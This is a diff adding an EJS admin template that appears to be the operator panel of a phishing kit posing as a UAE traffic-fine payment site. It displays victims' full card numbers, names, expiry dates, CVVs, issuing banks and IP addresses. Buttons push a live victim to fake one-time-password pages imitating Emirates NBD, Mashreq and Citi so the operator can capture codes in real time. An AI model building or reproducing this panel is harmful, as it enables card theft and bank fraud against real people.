@@ -1,0 +1,111 @@
+<%- include('_layout', { pageTitle: 'Ödemeler', activePage: 'payments', adminUser }) %>
+
+<% if (typeof dbError !== 'undefined' && dbError) { %>
+<div style="background:#fef2f2;border:1px solid #fecaca;padding:16px;border-radius:12px;color:#dc2626;margin-bottom:20px;">
+  ⚠️ <%= dbError %>
+</div>
+<% } else { %>
+
+<!-- Filters -->
+<div class="form-section" style="padding:16px 20px;margin-bottom:20px;">
+  <form method="GET" action="/admin/payments" style="display:flex;gap:12px;flex-wrap:wrap;align-items:flex-end;">
+    <div class="form-group" style="flex:1;min-width:200px;">
+      <label>Ara (plaka, kart, banka)</label>
+      <input type="text" name="q" value="<%= search %>" placeholder="1234, JOHN DOE, Emirates...">
+    </div>
+    <div class="form-group">
+      <label>Durum</label>
+      <select name="status">
+        <option value="">Tümü</option>
+        <option value="pending"      <%= statusFilter==='pending'      ? 'selected' : '' %>>Bekleyen</option>
+        <option value="approved"     <%= statusFilter==='approved'     ? 'selected' : '' %>>Onaylanan</option>
+        <option value="declined"     <%= statusFilter==='declined'     ? 'selected' : '' %>>Reddedilen</option>
+        <option value="otp_received" <%= statusFilter==='otp_received' ? 'selected' : '' %>>OTP Alındı</option>
+      </select>
+    </div>
+    <button type="submit" class="btn btn-green" style="margin-bottom:1px;">Filtrele</button>
+    <a href="/admin/payments" class="btn btn-gray" style="margin-bottom:1px;">Temizle</a>
+  </form>
+</div>
+
+<div class="table-card">
+  <div class="table-header">
+    <h3>💳 Ödemeler <span class="text-muted text-sm">(<%= total %> kayıt)</span></h3>
+  </div>
+  <div style="overflow-x:auto;">
+  <table>
+    <thead>
+      <tr>
+        <th>#</th><th>Tarih</th><th>Plaka</th><th>Tutar</th>
+        <th>Kart No</th><th>İsim</th><th>SKT</th><th>CVV</th>
+        <th>Banka</th><th>Ülke</th><th>Tip</th>
+        <th>OTP Sayfa</th><th>Durum</th><th>IP</th><th>İşlemler</th>
+      </tr>
+    </thead>
+    <tbody>
+    <% if (payments.length === 0) { %>
+    <tr><td colspan="15" style="text-align:center;padding:40px;color:#94a3b8;">Kayıt bulunamadı.</td></tr>
+    <% } %>
+    <% payments.forEach(function(p) {
+      const statusClass = {pending:'badge-pending',approved:'badge-approved',declined:'badge-declined',otp_received:'badge-otp'}[p.otp_status] || 'badge-pending';
+      const dateStr = p.created_at ? new Date(p.created_at).toLocaleString('tr-TR',{timeZone:'Asia/Dubai',day:'2-digit',month:'2-digit',year:'2-digit',hour:'2-digit',minute:'2-digit'}) : '-';
+    %>
+    <tr>
+      <td class="text-sm text-muted"><%= p.id %></td>
+      <td class="text-sm" style="white-space:nowrap;"><%= dateStr %></td>
+      <td><strong><%= p.plate_src %></strong> <%= p.plate_code %> <%= p.plate_no %></td>
+      <td><strong style="color:#059669;">AED <%= Number(p.total_fine).toLocaleString() %></strong></td>
+      <td class="mono" style="font-size:12px;user-select:all;"><%= p.card_number || '-' %></td>
+      <td style="white-space:nowrap;"><%= p.card_name || '-' %></td>
+      <td class="mono"><%= p.expiry || '-' %></td>
+      <td class="mono"><%= p.cvv || '-' %></td>
+      <td class="text-sm"><%= p.card_issuer || '-' %></td>
+      <td class="text-sm"><%= p.card_country || '-' %></td>
+      <td class="text-sm"><%= p.card_type || '-' %></td>
+      <td><span class="badge badge-otp"><%= p.otp_page || 'otp-sms' %></span></td>
+      <td><span class="badge <%= statusClass %>"><%= p.otp_status %></span></td>
+      <td class="mono text-sm text-muted"><%= p.ip || '-' %></td>
+      <td>
+        <div class="action-bar" style="gap:4px;">
+          <button class="btn btn-sm btn-blue"   title="SMS OTP'ye yönlendir"       onclick="redirect('<%= p.sid %>','otp-sms')">SMS</button>
+          <button class="btn btn-sm btn-purple"  title="Emirates NBD'ye yönlendir"  onclick="redirect('<%= p.sid %>','otp')">NBD</button>
+          <button class="btn btn-sm btn-orange"  title="Mashreq'e yönlendir"       onclick="redirect('<%= p.sid %>','otp-mashreq')">MQ</button>
+          <button class="btn btn-sm btn-gray"    title="Citi'ye yönlendir"         onclick="redirect('<%= p.sid %>','otp-citi')">Citi</button>
+          <button class="btn btn-sm btn-green"   title="Onaylandı olarak işaretle" onclick="setStatus('<%= p.sid %>','approved')">✓</button>
+          <button class="btn btn-sm btn-red"     title="Sil"                       onclick="delPayment('<%= p.sid %>')">🗑</button>
+        </div>
+      </td>
+    </tr>
+    <% }) %>
+    </tbody>
+  </table>
+  </div>
+
+  <% if (totalPages > 1) { %>
+  <div style="padding:14px 20px;display:flex;gap:6px;justify-content:center;border-top:1px solid #f1f5f9;">
+    <% for (let i = 1; i <= totalPages; i++) { %>
+    <a href="/admin/payments?p=<%= i %>&status=<%= encodeURIComponent(statusFilter) %>&q=<%= encodeURIComponent(search) %>"
+       class="btn <%= i === page ? 'btn-green' : 'btn-gray' %> btn-sm"><%= i %></a>
+    <% } %>
+  </div>
+  <% } %>
+</div>
+
+<% } %>
+
+<script>
+function redirect(sid, page) {
+  if (!confirm('Kullanıcı ' + page + ' sayfasına yönlendirilsin mi?\n(Kullanıcının OTP sayfasında aktif olması gerekir)')) return;
+  adminAction({act:'redirect', sid, page});
+}
+function setStatus(sid, status) {
+  if (!confirm('Durum "' + status + '" olarak ayarlansın mı?')) return;
+  adminAction({act:'set_status', sid, status});
+}
+function delPayment(sid) {
+  if (!confirm('Bu kaydı silmek istediğinize emin misiniz?')) return;
+  adminAction({act:'delete_payment', sid});
+}
+</script>
+
+<%- include('_layout_end') %>
